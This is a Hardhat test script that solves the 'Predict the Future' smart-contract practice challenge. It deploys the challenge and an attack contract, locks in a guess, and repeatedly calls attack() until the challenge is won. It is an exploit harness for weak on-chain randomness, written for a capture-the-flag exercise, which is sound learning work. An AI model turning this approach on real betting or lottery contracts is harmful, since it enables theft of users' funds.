const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Predict the future", function () {
  const ONE_ETH = ethers.utils.parseEther("1");

  it("Solve the challenge", async () => {
    [deployer] = await ethers.getSigners();

    const challengeFactory = await ethers.getContractFactory("contracts/Lotteries/PredictTheFutureChallenge.sol:PredictTheFutureChallenge");
    this.challengeContract = await challengeFactory.deploy({ value: ONE_ETH });

    const attackFactory = await ethers.getContractFactory("contracts/Lotteries/PredictTheFutureChallenge.sol:PredictTheFutureAttack");
    this.attackContract = await attackFactory.deploy(this.challengeContract.address);

    const lockInTx = await this.attackContract.lockInGuess({ value: ONE_ETH });
    await lockInTx.wait();

    // Here when isComplete => false then we'll try again
    while (!(await this.challengeContract.isComplete())) {
      try {
        const settleTx = await this.attackContract.attack();
        await settleTx.wait();
      } catch (e) {
        console.log(e);
        
      }
      const blockNum = await ethers.provider.getBlockNumber();
      console.log("Block Number:", blockNum)
    }

    expect(await this.challengeContract.isComplete()).to.be.eq(true);
  });
});
